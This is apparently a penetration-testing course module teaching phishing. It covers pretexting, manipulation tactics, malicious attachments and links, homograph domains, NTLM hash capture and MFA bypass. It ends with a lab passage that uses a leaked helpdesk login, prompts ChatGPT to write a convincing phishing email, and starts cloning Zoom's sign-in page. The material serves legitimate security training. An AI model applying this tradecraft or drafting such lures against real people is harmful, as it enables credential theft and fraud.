In this Learning Module, we will cover the following Learning Units:

- Phishing 101
- Payloads, Misdirection and Speedbumps
- Hands-On Credential Phishing

Phishing involves both technical skills and social manipulation. Experts consider it a strategic and precise method used in cyberattacks.

Phishing attacks are categorized into two main types: **broad phishing** (mass attacks) and **spear phishing** (targeted attacks). A typical [*phishing campaign*](https://www.barracuda.com/support/glossary/phishing-campaign#:~:text=A%20phishing%20campaign%20is%20an,person%20in%20an%20email%20communication.) targets many people at once with generic messages designed for broad appeal.

In contrast, [*spear phishing*](https://www.ibm.com/topics/spear-phishing) targets specific individuals with personalized attacks, requiring detailed research. A spear phishing attack requires research into targets’ behaviors, preferences, and vulnerabilities to create convincing messages. This information is crucial for creating a convincing campaign and *pretext* that the targets are likely to fall for.

Attackers now leverage [*Generative AI*](https://www.ibm.com/topics/generative-ai) (Gen AI) to improve social engineering tactics. By using AI-augmented technologies such as [*Large Language Models*](https://www.ibm.com/topics/large-language-models) (LLMs), process large amounts of public data to identify potential phishing targets. This approach helps attackers streamline the research process and personalize their attacks.

Attackers have also begun leveraging [Generative AI audio models](https://elevenlabs.io/blog/what-is-generative-ai-audio) to clone voices and generative video models to create [*deepfake*](https://www.techtarget.com/whatis/definition/deepfake) videos that convincingly replicate an individual’s facial expressions, movements, and voice patterns.

Cybercriminals use AI to make phishing harder to detect. This module teaches you how to spot and stop these threats.

In this Learning Module, we'll discuss the fundamental concepts behind a successful phishing campaign. We'll then construct and conduct our own phishing campaign in which we'll attempt to gain access to sensitive user credentials.

## 11.1. Phishing 101

This Learning Unit covers the following Learning Objectives:

- Understanding Email Phishing
- Exploring Smishing, Vishing, and Chatting
- Enhancing Phishing through Social Engineering
- Leveraging LLMs, Generative AI, and Deepfakes

Phishers have different goals: running malicious code or stealing login credentials. This objective determines the attack’s execution strategy.

Once attackers decide on an objective, they generally identify a communication method.

Email remains the most traditional and commonly used phishing medium. However, [*smishing*](https://www.ibm.com/think/topics/smishing) (SMS phishing), [*vishing*](https://www.cisco.com/site/us/en/learn/topics/security/what-is-vishing.html#:~:text=Vishing%2C%20short%20for%20voice%20phishing%2C%20refers%20to%20fraudulent%20phone%20calls,card%20numbers%2C%20or%20bank%20details.) (voice phishing), and deepfake-enhanced phishing attempts are becoming increasingly common. These methods can sometimes be combined for greater effectiveness.

This Learning Unit explains phishing approaches and how Generative AI enhances them.

## 11.1.1. Email Phishing

To better understand the social and technical mechanisms behind phishing campaigns, let's put together our own demonstration email phishing campaign.

The email text is often crafted with a particular goal, such as convincing the target to perform an action that will execute code. In this case, the attacker will likely include a malicious attachment in the email and persuade the target to open it, which triggers the execution of a specific payload. Malicious attachments can take different forms, including Office documents, PDFs, 7zip/zip archives, shortcut files, and calendar invites.

Attackers may embed a link that leads to an exploit-laden website. Clicking on these links can lead to the exploitation of vulnerabilities in specific browsers, enabling the attacker to run code on the target’s machine.

Alternatively, the email text might attempt to persuade the user to click a link which connects them to a malicious website which closely resembles a site the user often logs into. If the user logs in, the attacker gains possession of those credentials.

In phishing, a pretext is a fake story designed to convince someone to open a link or attachment. A successful attack relies on a believable [*pretext*](https://www.ibm.com/think/topics/pretexting). Small details matter—typos, bad grammar, and formatting mistakes can expose the scam. The pretext should be as believable and as seamless as possible to avoid raising suspicion.

This requires solid social engineering skills, a strong command of the target’s primary language, and details collected through research to add realism to the attack and convince the target to take the desired action.

Despite this information, crafting a convincing pretext remains complex. For example, our email must come from a familiar, or at least a seemingly benign source and we should align other email-based metadata with something the target might expect. For example, if we send an email from an unfamiliar domain, the recipient is less likely to open it and engage with it. To address this, attackers often purchase look-alike domains resembling the target’s organization, its vendors, or other familiar companies.

Along these lines, if an attacker gains access to a legitimate email account from the target's organization or one of the target's clients (perhaps by way of a public data breach or leaked credentials), they will use that account as it significantly improves their chances of success.

As for the pretext, it must align with the expectations of a target. If, for example, we're attempting to run a phishing campaign against the HR department of an organization, we should align our pretext with the kinds of emails an HR department is used to receiving. Getting this right takes some research, and often some working knowledge of the target's department and job roles.

It's also worth mentioning [*whaling*](https://www.ibm.com/topics/whale-phishing), a form of spear phishing that focuses on high-profile individuals. These targeted attacks require more care and attention than a typical phishing campaign. These pretexts are often highly customized and require significant research or inside knowledge of the target.

Info

When performing a phishing engagement for an organization, we will often receive a list of email addresses that we're not allowed to target. This list often includes high-profile individuals from the organization.

There are also very generic approaches we might take in phishing. One generic approach involves mimicking an email from a commonly used service like [*Slack*](https://slack.com/), [*Zoom*](https://zoom.us/), Google's [*Gmail*](https://mail.google.com/), or [*Microsoft Teams*](https://teams.microsoft.com/), which links to a cloned website which resembles that particular service. This is sometimes known as [*clone phishing*](https://www.proofpoint.com/uk/threat-reference/clone-phishing). This approach can be useful for large-scale phishing campaigns.

In summary, email-based phishing begins with extensive research into our target, and a solid objective. With our research and objective set, we can develop and furnish a pretext which will help achieve this objective. We then execute the phishing campaign, which synthesizes all the research and pretext work into a direct, technical campaign.

In the next section, we'll discuss other technologies we might want to consider when conducting a phishing campaign.

## 11.1.2. Smishing, Vishing, and Chatting

In addition to more-traditional email-based phishing campaigns, attackers can also leverage [*smishing*](https://www.ibm.com/topics/smishing) (a portmanteau of "SMS" and "phishing") to phish a target through SMS or other mobile messaging platforms.

SMS is a more personal and direct than email communication. The effectiveness of a smishing attack depends on the target. For example, a phishing message sent to a work phone should have a work-related context, while one sent to a personal phone would seem more authentic if it includes references to specific friends or family. In addition, since the target will not have the source phone number in their contact list, an attacker must add pretext to address this. These are crucial considerations when attempting to smish a target.

For example, in a popular ["CEO gift card scam"](https://2technical.co.uk/is-that-really-a-text-from-your-ceo-or-is-it-a-scam/), the attacker poses as a senior executive trying to send an employee a gift card. This could sway a target, especially if they believe the message came from a company executive.

Another category of phishing is voice phishing, sometimes called [*vishing*](https://www.fortinet.com/resources/cyberglossary/vishing-attack) This is a combination of ‘voice’ and ‘phishing, in which an attacker calls a target on the phone, and speaks to them directly. Traditional vishing relies more on social engineering skill rather than technical skill.

We can also use [caller ID spoofing techniques](https://usa.kaspersky.com/resource-center/preemptive-safety/phone-number-spoofing) in smishing and vishing campaigns to alter the sender or caller's source number. This has become more common because of the prevalence of Voice over Internet Protocol (VoIP) technologies.

In an adjacent style of social engineering attack known as [*SIM swapping*](https://www.natwest.com/fraud-and-security/fraud-guide/sim-swapping-scams.html), attackers call a mobile network provider and claim to be the owner of a specific mobile phone account. They then convince the network provider to transfer the phone number from the target's SIM card to a SIM card they control. This gives them control over the target's phone number, until the target is able to recover their access. This can of course be used for spoofing, but more critically, it is often used to bypass phone-based Multi-Factor Authentication (MFA) protections.

As we wrap up this section, we should also highlight that chat and messaging applications are frequent phishing targets. This includes the popular [*Discord*](https://discord.com/), [*Slack*](https://slack.com/) and [Microsoft Teams](https://www.microsoft.com/en-us/microsoft-teams/group-chat-software) applications.

Regardless of the communication medium, attackers could adopt a broad, generic phishing approach against a broad range of targets or opt for a more precise attack against a smaller target base, depending on the overall objective.

## 11.1.3. Enhancing Phishing through Social Engineering

Now that we've briefly discussed a variety of social engineering techniques, let's discuss a few important foundational social engineering concepts and techniques that attackers typically wield in an attack.

Social engineering relies on psychological manipulation rather than technical expertise. This means attackers use more "human" judgment when deploying them, which is refined over time through some trial and error. Borrowing from this, as penetration testers, we want our phishing campaign to be as believable as possible, and adding some social engineering "spice" can introduce a little pressure which may encourage our targets to ignore their more sensible rational judgments.

Gaining the target's **trust** is the ultimate goal of any successful phishing campaign. We want our target to trust in our phish enough to entice them to follow through with what we are asking them to do. This requires we make a good impression. Put simply, our pretext must align with the target's expectations and avoid raising suspicion.

By extension, our pretext must align with our payload. For example, if our pretext suggests we are from a particular company, the landing page behind our malicious link must mirror that company's web page. The domain of the sending address and URL link must also pass at least a cursory inspection, which is why skilled phishers often purchase lookalike domain names. Minute details are also important, such as a TLS-enabled website since an insecure HTTP connection could raise suspicion. Carelessness can erode trust, so details matter.

But technical elements aren't the only factors in creating trust. We also need to use softer skills. For example, if we are impersonating a particular person (or even using their compromised email account) attempt to approximate that person's writing tone. We also want it to feel familiar and not raise suspicion. A more sophisticated tactic involves establishing rapport with the target before persuading them to open a malicious file or link.

Recognizing how to build trust (or how to exploit an existing trust relationship) is probably the most fundamental skill in successful phishing. However, there are other strategies we should consider in a phishing campaign.

*Urgency* is a common social engineering technique used by phishers, manipulating targets into acting quickly without questioning the safety of the requested action or critically reflecting on what they're doing. Introducing a sense of urgency works best in organizations which have unhealthy work cultures. If a target often receives urgent requests and is expected to deliver on them without any critical thought, they are much more likely to fall for these kinds of manipulations.

Another strategy, *fear*, can cause a target to momentarily suspend their judgment, increasing the likelihood of compliance. *Authority*, a similar strategy to fear, can amplify the urgency of our request. This often involves taking on the role of a superior, or even the company's CEO. These strategies must be balanced as we consider elements of trust and the benefits of creating a good rapport.

Finally, we'll often leverage a positive incentive like a *reward*, in a process known as *baiting* in which we offer something tangible to lure a target into performing an action. The promise might include a gift card, cash, or another incentive or intangible benefits like gaining favor with a superior. Offering something tangible in exchange for participation in something like a survey is not an uncommon approach for companies in general. This kind of approach might blend into the background noise for some targets.

The social elements of a phish directly correlate to the success rate of the campaign. Exploiting a trust relationship, and possibly adding other kinds of manipulations along the way, can help a target suspend their judgment, which can improve the effectiveness of a phishing campaign.

## 11.1.4. LLMs, Generative AI and Deepfakes

The introduction of [*Large Language Models*](https://www.ibm.com/topics/large-language-models) (LLMs) and [*Generative AI*](https://www.ibm.com/topics/generative-ai) (Gen AI) technologies present new opportunities for phishing and social engineering. Gen AI technologies are also particularly useful in research and LLMs in particular can advance the development of a pretext.

Some threat intelligence groups have noted the use of Gen AI in real-world phishing campaigns. For example, in 2023, [Microsoft warned of an uptick in the use of LLMs in crafting phishing emails](https://www.microsoft.com/en-us/microsoft-365-life-hacks/privacy-and-safety/how-ai-changing-phishing-scams). Mandiant's [2024 M-Trends report](https://cloud.google.com/security/resources/m-trends) noted the rising use of [Gen AI in social engineering and information operations](https://cloud.google.com/blog/topics/threat-intelligence/threat-actors-generative-ai-limited).

However, these groups can only report on observable activity. For example, they cannot determine how end users leverage Gen AI in the planning and research stages of a phishing attack. LLMs in particular can collect relevant information about a target, as well as generate text for use in emails and websites. For example, an LLM could assist with [*Retrieval Augmented Generation*](https://cloud.google.com/use-cases/retrieval-augmented-generation) (RAG) to process a large amount of publicly-available information about a target, and distill this into material we can turn into a solid pretext. RAG may not even be necessary against high-profile targets, as the model may already have useful information. By creatively leveraging Gen AI, attackers can craft more personalized and convincing attacks.

In addition, technologies such as [*voice cloning*](https://elevenlabs.io/voice-cloning) have become much more available to the general public in recent years. These technologies allow attackers to create a voice model for an individual, based on a relatively small amount of recorded audio. They can then make this model say whatever they want. As Gen AI has become more available, the capabilities of voice cloning have become more advanced, and much harder to detect.

Deepfake videos are also being used in phishing attacks. In 2024, Architecture firm Arup fell prey [to a deepfake video scam](https://edition.cnn.com/2024/05/16/tech/arup-deepfake-scam-loss-hong-kong-intl-hnk/index.html). During a video call, deepfake clones of the CFO and other staff appeared and acted as actual employees. The deepfaked CFO signed off on a transfer of $25 million, which was then transferred to the attackers.

As Gen AI technologies become more advanced, we can leverage them as penetration testers to complement traditional phishing techniques.

## 11.2. Payloads, Misdirection, and Speedbumps

This Learning Unit covers the following Learning Objectives:

- Understanding the Role of Inbound email Filters
- Identifying Risks of Malicious Office Macros
- Assess Threats from Malicious Files
- Recognize Malicious Links
- Differentiate Credential Phishing and Multi-Factor Authentication (MFA)

With our research complete, we can focus on payloads. Attackers use different methods to deliver phishing payloads. As discussed earlier, the specific approach we decide on depends what we're trying to achieve, so the payload we choose will vary based on what's appropriate for the specific objective of the phishing campaign.

In this section, we'll discuss payloads we might consider when planning a phishing campaign, the approaches we might use to implement them, and strategies for delivering them to make them seem more convincing.

## 11.2.1. Understanding the Role on Inbound Email Filters

Before jumping into a discussion about payloads, let's consider potential defenses enterprises might implement. The most common technologies designed to impact phishing campaigns include [inbound email filters](https://www.proofpoint.com/uk/threat-reference/email-filtering), which scan all incoming email for markers of malicious behavior, and block them if they look suspicious.

Most email filtering technologies consider the relative *reputation* of an incoming email's domain. This is calculated in various ways depending on the product, but most tend to use [reputation block lists](https://icannwiki.org/Reputation_Block_Lists), in combination with other factors like the relative age of the sender's email domain.

Most email filtering products scrutinize file attachments, so we must leverage evasion techniques when delivering our payloads. Certain file attachments are especially scrutinized, including **EXE** and **SCR** file types, which are often considered malicious. Depending on the product, other executables (or files that contain executable code) may be considered malicious, including Office documents, PDF files, archive files (like ZIP files), or script files as well as hyperlinks that point to external domains hosting these file types.

As a fallback, many organizations also explicitly flag email originating from external domains with visible markers. For example, a incoming email from an external domain might have its subject prepended with a string like `[EXTERNAL]`. This is designed to give users a quick visual warning that the email has come from outside the organization, even if it has been designed to look as though it comes from a colleague.

Email-based phishing campaigns encounter numerous roadblocks that must be navigated for success.

## 11.2.2. Identifying Risks of Malicious Office Macros

Phishers find the Microsoft Office suite extremely useful due to its exploitable features. Given its widespread use, Microsoft Office has become a prime target for phishers over the years, who embed payloads in these documents and distribute them in their campaigns.

Several applications in the Microsoft Office family support [*Visual Basic for Applications*](https://learn.microsoft.com/en-us/office/vba/library-reference/concepts/getting-started-with-vba-in-office) (VBA), a built-in scripting language that enables Office documents to execute custom [*macros*](https://learn.microsoft.com/en-us/office/vba/library-reference/concepts/getting-started-with-vba-in-office). Macros are intended to make Office documents more dynamic with embedded automation, which can be useful when distributing complicated documents in a large organization.

Attackers have been using malicious Office macros to execute code for a long time. In 1999, the US-CERT warned about the [Melissa Macro Virus](https://insights.sei.cmu.edu/documents/506/1999_019_001_496184.pdf), which originated from a malicious Microsoft Word document. Since then, attackers have used Office macros *extensively* in phishing campaigns.

Microsoft has attempted to address malicious macros. First, they disabled them by default, forcing users to explicitly enable them. Microsoft also introduced the [Mark of the Web](https://en.wikipedia.org/wiki/Mark_of_the_Web) (MotW), a file attribute set by Windows when a file is downloaded from an external source. This is enabled by Windows' default NTFS file system.

Here's an example of MotW shown in a file's properties:

![[OffSec/OSCP/z. images/4f71f5a4873ea42a3fb37f98589fd345_MD5.jpg]]

Figure 1: Mark of the Web shown in the file properties

Info

Attackers can bypass MotW using exploits like [CVE-2022-41091](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41091), though security patches often close these gaps quickly.

Windows applications can reference the MotW to determine whether a file should be trusted. Some applications will choose not to trust applications that appear to have been downloaded from an external source.

In an example of this, Microsoft introduced [*Protected View*](https://support.microsoft.com/en-gb/office/what-is-protected-view-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653), which presents a warning when users open Office documents with the MotW attribute set. In this case, users must take action to bypass the warning and edit the document or use its dynamic content, including macros.

In a recent development, [Microsoft started blocking macros running in any documents with a MotW by default](https://learn.microsoft.com/en-us/microsoft-365-apps/security/internet-macros-blocked). This makes phishing with Office macros less effective, since any file downloaded from an email will have the MotW attribute set.

Administrators can also enforce these various protections at the AD Group Policy level, preventing domain-attached machines from exiting the Protected View, or running macros at all. These kinds of protections can't be overridden by individual users.

While Office macros have been commonly used for phishing campaigns in the past, they are likely to become less common in the near future. However, we should not discount them as an attack vector. Many organizations run outdated versions of Microsoft Office, preventing them from implementing the latest security features. In addition, some enterprises only apply basic Group Policies to Office documents, potentially disabling security features.

We'll discuss Microsoft Office macros in more detail in a later module.

## 11.2.3. Assess Threats from Malicious Files

Macros aren't the only files that can execute client-side code. While Windows-based **EXE** files are executable (as the name suggests) it's statistically unlikely that these files will even reach a target's inbox. Even if an **EXE** file reached its intended destination, most users are aware of the danger of this type of file. Because of this, attackers have moved to other types of files, including [SCR files](https://www.malwarebytes.com/blog/news/2014/11/rogue-scr-file-links-circulating-in-steam-chat), [HTA files](https://trustedsec.com/blog/malicious-htas), and [JScript files](https://www.broadcom.com/support/security-center/protection-bulletin/yet-another-jscript-rat-spreads-via-phishing-campaign).

However, given the popularity of Office documents in enterprise environments, attackers have begun using other ancillary Office documents that may skirt the protections of mainstream Word, PowerPoint or Excel documents.

For example, [CVE-2017-11882](https://nvd.nist.gov/vuln/detail/CVE-2017-11882) is a memory corruption vulnerability in the [Equation Editor](https://support.microsoft.com/en-gb/office/equation-editor-6eac7d71-3c74-437b-80d3-c7dea24fdf3f), which was bundled with Microsoft Office until 2018. Even as late as 2023, some endpoint protection vendors [reported seeing active exploitation of this vulnerability](https://www.kaspersky.co.uk/blog/cve-2017-11882-exploitation-on-the-rise/26372/) targeting organizations who had not updated Office.

Similarly, [CVE-2023-21716](https://nvd.nist.gov/vuln/detail/CVE-2023-21716) is a vulnerability in Microsoft Word which targets the [RTF file](https://en.wikipedia.org/wiki/Rich_Text_Format) parser. [PoCs for this vulnerability](https://github.com/JMousqueton/CVE-2023-21716) are also publicly available.

Even though vulnerabilities related to Microsoft Office documents can grant code execution without macros, this approach is somewhat limited given the typical enterprise patch cycle.

Other applications are also prone to file parsing vulnerabilities, including PDF viewers. Adobe Acrobat Reader is a common target for attackers and vulnerability researchers alike. Consider [CVE-2023-21608](https://nvd.nist.gov/vuln/detail/CVE-2023-21608), which is a [*use-after-free*](https://owasp.org/www-community/vulnerabilities/Using_freed_memory#:~:text=Use%20after%20free%20errors%20occur,conditions%20and%20other%20exceptional%20circumstances) vulnerability. Several [public PoCs for this vulnerability](https://github.com/hacksysteam/CVE-2023-21608) can execute arbitrary code.

In an especially advanced targeted phishing attack, we could even leverage a vulnerability in a piece of software which we know our target runs. In this case, we would research the kinds of software our target may be using and try to find vulnerabilities which may affect that software. Different industries tend to use different kinds of software from document readers such as [*Office*](https://www.microsoft.com/en-us/microsoft-365/microsoft-office) and [*Adobe Reader*](https://get.adobe.com/reader/) or email clients such as [*Outlook*](https://www.microsoft.com/en-us/microsoft-365/outlook/outlook-for-windows) to browsers such as [*Google Chrome*](https://www.google.com/chrome/?brand=FHFK&ds_kid=43700078760035379&gad_source=1&gclid=Cj0KCQiA7se8BhCAARIsAKnF3rzmTRPb6eMuxWuYmlZDLVV_BN7HVXj8Gjcse-T64Xzs8SNXZs7jGZEaAp9oEALw_wcB&gclsrc=aw.ds). We could even research job postings or websites such as [*Glassdoor*](https://www.glassdoor.com/index.htm), [*LinkedIn*](https://www.linkedin.com/), company websites, software review websites like [*G2 Crowd*](https://www.g2.com/) or [*Capterra*](https://www.capterra.com/), industry-specific forums or blogs, and technology news websites to gain information about technology used by the target organization.

Some advanced attackers may even try to find 0-day vulnerabilities in a piece of software they know a target is using. This is a common approach in spearphishing attacks.

Again, this type of attack may have a short shelf life, especially those which are publicly known and have patches available. In addition, searching for 0-days can be costly and time-consuming, making this a historically reserved approach, but given Microsoft's relatively recent stance on macro security, this approach is becoming more common.

Advanced attackers now reverse-engineer security patches to find new vulnerabilities before they are patched. This gives them a short but effective window to launch attacks.

## 11.2.4. Recognize Malicious Links

Attackers may attempt to bypass the various file protection mechanisms discussed above by convincing targets to click on malicious links. In this section, we’ll examine this approach in greater detail.

One approach to credential harvesting is to host a website clone of a commonly used service, like:

- [*Google's Gmail*](https://mail.google.com/)
- [*Zoom*](https://zoom.us/signin),
- [*Microsoft login page*](https://login.microsoftonline.com/)

This, in conjunction with a convincing pretext in the phishing email, might be enough to convince a target to enter their real credentials, which we can then capture and reuse.

However, password manager applications will expose these websites as frauds since they will only trigger on the proper domain. They won't, for example, enter stored credentials for **microsoft.com** into **m1cros0ft.com**.

There are flaws in the protection password manager offer, however. Let's discuss a few examples.

In 2016, a researcher released details of a vulnerability in the [LastPass](https://www.lastpass.com/) browser extension which [could trick it into revealing passwords by crafting a specific URI](https://labs.detectify.com/writeups/how-i-made-lastpass-give-me-all-your-passwords/).

In 2017, the Google Project Zero team published details of a bug in the LastPass browser extension which [could allow attackers to arbitrarily read passwords from a user's password vault, and even possibly execute code](https://bugs.chromium.org/p/project-zero/issues/detail?id=1209).

A 2021 vulnerability in the Safari 1Password browser extension allowed attackers to [read items from the user's vault-like credit card information](https://nvd.nist.gov/vuln/detail/CVE-2021-41795).

In 2023, an [AutoSpill](https://i.blackhat.com/EU-23/Presentations/EU-23-Gangwal-AutoSpill-Zero-Effort-Credential-Stealing.pdf) attack exploited the way Android exposed [WebViews](https://developer.android.com/reference/android/webkit/WebView) to the parent app, which could allow a malicious Android application to steal credentials.

Although there are vulnerabilities in password managers and their infrastructure, we can't always exploit them in a credential phishing campaign. Because of this, password managers are still a roadblock in most credential phishing campaigns.

In some more advanced link-based phishing attempts, an attacker might not try to extract credentials at all. Instead, they might link to a web page which triggers a browser exploit which would allow them to run arbitrary code. However, this approach is quite advanced, and uncommon without access to a browser exploit 0-day or N-day, a very reliable exploit, and a target opening our link in the specific vulnerable browser.

In other more specific cases, a malicious web page might also try to exploit a [*Cross-Site Request Forgery*](https://owasp.org/www-community/attacks/csrf) (CSRF) exploit. These kinds of vulnerabilities rely on the fact that a target's browser might have an existing session open with a specific web service, which an attacker might be able to compel the target's browser to perform some action on. For example, they might be able to create a page which forces a logged-in user to create a new account on a particular service. In extreme cases, attackers may be able to execute arbitrary code on a service. For example, [CVE-2024-1879](https://nvd.nist.gov/vuln/detail/CVE-2024-1879) describes a CSRF vulnerability in AutoGPT which could execute arbitrary code on a vulnerable system.

Regardless of the approach, the link must appear credible and enticing. We could use social engineering to make the link more enticing and make it appear harmless. In addition, when the target opens the link, we want to make sure that the actual URL doesn't look too suspicious. URLs with random strings, or strings which are inappropriate to the pretext of the phish, will likely alarm the target.

To achieve this, we might obfuscate the embedded link using a URL shortener such as [TinyURL](https://tinyurl.com/) or [Bitly](https://bitly.com/). However, the third-party service might disable our link if the service provider discovers the link points to malware.

We might also consider using [homograph URLs](https://en.wikipedia.org/wiki/IDN_homograph_attack). These are URLs that replace ASCII characters in a URL with characters from the Cyrillic, Greek, or Latin alphabets. For example, [*apple.com*](https://www.apple.com/) and [*аррӏе.com*](https://www.xn--1za7fqa6ba.com/) look very similar. However, the "l" in the second URL is replaced with the Cyrillic "І". In many browsers, these will render almost identically in the URL bar. However, they actually point at totally different websites.

There are other details we need to consider to make a malicious site look convincing. As mentioned before, HTTPS is typically required because sites without TLS are rare, especially on sites that ask for login information. So we need to point the target to a site which uses (valid) HTTPS, in order to avoid the obvious warning that most browser will display when connecting to an insecure site.

Approaches like CSRF, which compel a target to authenticate to a resource, may inadvertently leak information or enable unauthorized actions that are advantageous to attackers.

For example, although Windows has begun deprecating [*NTLM*](https://en.wikipedia.org/wiki/NTLM), we could leverage an authentication leak against older systems. In this scenario, an attacker could send a malicious link that forces authentication and, when the target clicks the link, the system enters into an NTLM handshake. The attacker could then capture the NetNTLMv2 hash. This could also work through an embedded link pointing to an image on an SMB server. If the target opens the message containing the image, this could trigger the handshake and compromise the hash. Although this approach has become somewhat dated, it has been spotted in the wild [as recently as February 2024](https://www.proofpoint.com/uk/blog/threat-insight/ta577s-unusual-attack-chain-leads-ntlm-data-theft).

As we've discussed, malicious links bypass file protections by tricking users into clicking harmful URLs.These links may redirect to lookalike sites for credential theft or exploit vulnerabilities such as CSRF, browser flaws, or NTLM handshakes. Whatever the objective, we can use obfuscation, convincing pretexts, and careful research to make our links appear more legitimate and enticing.

## 11.2.5. Differentiate Credential Phishing and Multi-Factor Authentication (MFA)

Once we have credentials, we may hit another roadblock in the form of [Multi-Factor Authentication](https://www.onelogin.com/learn/what-is-mfa) (MFA). This is another security mechanism which many organizations implement to slow down an attack, even in the event of credential compromise.

There are several ways we might want to handle this. One common technique is [*prompt bombing*](https://www.tripwire.com/state-of-security/mfa-prompt-bombing-what-you-need-know), which targets MFA applications that use push-based authentication prompts. In this strategy, we bombard the target with login attempts, which trigger prompts on their phone asking them to approve the login. This can create a phenomenon known as [*MFA fatigue*](https://duo.com/blog/mfa-fatigue-what-is-it-how-to-respond), where users assume the authorization requests are legitimate (albeit glitched) and accept one to stop the alerts.

The [Lapsus$ group](https://blog.knowbe4.com/being-annoying-as-a-social-engineering-approach) has used this approach successfully against various targets.

Another approach to defeat MFA is to add the MFA prompt directly into the credential-stealing website's login flow. This allows us to capture not only the victim's username and password but also their MFA token. However, once we've obtained the token, we must relay it to the legitimate application immediately since MFA tokens typically have a very short lifespan. This means timing is critical. While this approach only gives us single-use access to the target application, it can still be highly effective when used surgically and with detailed planning.

An alternative method involves a [*browser-in-the-middle*](https://capec.mitre.org/data/definitions/701.html) attack, where an attacker proxies a real session to capture authentication details. To the target, it appears they are interacting with the legitimate website, which they are. However, the session they create upon logging in (along with their MFA token) is actually under the attacker's control. Tools like [*cuddlephish*](https://github.com/fkasler/cuddlephish) help automate this kind of attack. Using such a tool requires access to a public IP address and can not be easily setup locally. If you're doing an [*assumed breach*](https://turingpoint.de/en/blog/what-are-assumed-breach-penetration-tests/) type pentest and are attempting to get access to internal web applications then such limitations become important.

Another technical approach to bypass MFA is brute-forcing. Since an MFA token is often six numbers, we could, at least in theory, attempt to brute-force it. This will obviously take time and bandwidth, assuming the MFA server even allows unlimited attempts and an (extremely long) response window.

We could also assume a less-technical approach and use social engineering. For example, we could contact a target directly, acting as a trusted figure like the company helpdesk, or a member of the IT department, and ask the target to provide the MFA token. This would generally require a very solid pretext.

Finally, if an MFA token is delivered by SMS, some criminal actors might also engage in SIM swapping to gain access to a target's phone number, and receive the MFA token themselves. This isn't something we can generally do in legitimate pentesting, due to the legal implications of the attack. However, it's important to understand this tactic as it is leveraged against SMS-based MFA systems.

## 11.3. Hands-On Credential Phishing

This Learning Unit covers the following Learning Objectives:

- Creating a Zoom Credential Phishing Pretext
- Cloning a Legitimate Website
- Cleaning Up the Clone
- Injecting Malicious Elements in the Clone
- Crafting the Phishing email

Now, let’s apply what we’ve learned in a controlled testing environment. In this Learning Unit, we'll go through the process of conducting a credential phishing campaign by developing a pretext, doing some research, setting up a cloned password-stealing portal, and finally, successfully phishing a target.

## 11.3.1. Creating a Zoom Credential Phishing Pretext

In this section, we'll develop a generic credential phishing campaign. For the purposes of simplicity, we will assume that we have already performed extensive research on our target organization, and have gained low-privileged access to an email account obtained through a public password leak. We'll use this to create a pretext (with the help of some AI tools), then spin up a malicious credential-stealing website.

The compromised email account (**helpdesk@mail.corp.com**) belongs to the helpdesk department of the **CORP.com** enterprise. This account appears to be shared among multiple users and only contains internal email correspondence. While we have access to the email address, the credentials don't seem to be reused anywhere else. Our next step is to use this limited access to attempt to expand our control and obtain more sensitive data.

Let's navigate to **http://192.168.X.77/mail/** to access the webmail portal on the **MAILER** machine.

The IP address of the webmail server will be different in your lab instance. Replace **192.168.X.77** with the IP address that's generated when you start the labs.

We'll use the credentials contained in the public leak data, logging in with the **helpdesk@mail.corp.com** username and enter **Helpdesk@Password2024** as the password.

![[OffSec/OSCP/z. images/d6a077746f99e29c6140ab2c46a46dc0_MD5.jpg]]

Figure 2: Webmail Login Page

Now that we have access to this account, let's do some light reconnaissance. First, we'll read some of the outgoing emails. Eventually we find a recent email sent from this address to multiple individuals in the organization's sales department:

![[OffSec/OSCP/z. images/f05345a1c481a63c8750a909f38b00fd_MD5.jpg]]

Figure 3: Checking the outgoing emails on the helpdesk account

The email refers to the sales department's Zoom licenses and instructs employees to log into Zoom within the next two weeks to keep their license active. The emails seem to have a very distinct voice and communication style. We'll imitate their style in our phishing email. If we have strong writing skills, we can do this ourselves, but this is also an easy task for an LLM.

Let's take this email sent from the helpdesk account and feed it to an LLM, along with a prompt asking it to write an email in that style. We will use [*ChatGPT*](https://chatgpt.com/) for this, but other LLMs could handle this request:

```
Looking at the following email: 

"Hello Sales department, 

Hope you're knocking it out of the park this week! We're trying to redo our inventory of Zoom licenses as we seem to have a large number which aren't being used at the moment. Rather than having everyone reply to the email, in order to keep your Zoom license, please just ensure that you login to your account and schedule a meeting within the next two weeks. Any accounts which don't do this within the time frame will be transitioned to a free license. 

Thank you very much for your cooperation and apologies for the hassle!" 

Write another email in the same style as this, and include a reminder for employees to login to Zoom. Include a hyperlink that can be clicked and directs people to the appropriate page.
```

> Listing 1 - The prompt we send to ChatGPT.

We pass this text to ChatGPT and, after a few seconds, we are provided with the following email example.

```
Subject: Reminder: Please Log In to Keep Your Zoom License!

Hello Sales department,

Just a quick reminder—hope everything’s going smoothly on your end! We’re still working on updating our Zoom license inventory and noticed that some accounts haven’t yet logged in to schedule a meeting. To make sure your account remains on a full license, please click here to log in and schedule a meeting within the next week.

If no meeting is scheduled by the deadline, any inactive accounts will be moved to a free license.

Thanks again for your cooperation, and sorry for the added task! Let us know if you have any questions.

Best regards,
[Your Company] Helpdesk Team
```

> Listing 2 - The text generated by ChatGPT in response to our prompt.

This output maintains consistency with the tone of our previous emails. Depending on the email structure provided, we may want to tweak it a bit, but for now this is a good start.

Next, we'll build a convincing credential phishing website.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

## 11.3.2. Cloning a Legitimate Website

In this scenario, we'll replicate the Zoom sign in page as closely and convincingly as possible. While we may modify some details to suit our needs, our credential phishing page will closely mimic the official Zoom sign-in page.

An internet search for "Zoom signin" points us to the [this](https://zoom.us/signin#/) page:

![[OffSec/OSCP/z. images/b516007b0552abc1915da20f0d9ed7cb_MD5.jpg]]

Figure 4: Official Zoom Signing Page

This will work as a good template. Let's clone this page. In our Kali VM, we'll create a `ZoomSignin` folder, where we'll store the various page resources we'll need.

```
kali@kali:~$ mkdir ZoomSignin

kali@kali:~/ZoomSignin$ cd ZoomSignin
```

> Listing 3 - Creating a working directory for our cloned website.

From within this directory, we can now use `wget` to clone the page, and grab all its assets. Let's walk through the arguments we'll use.

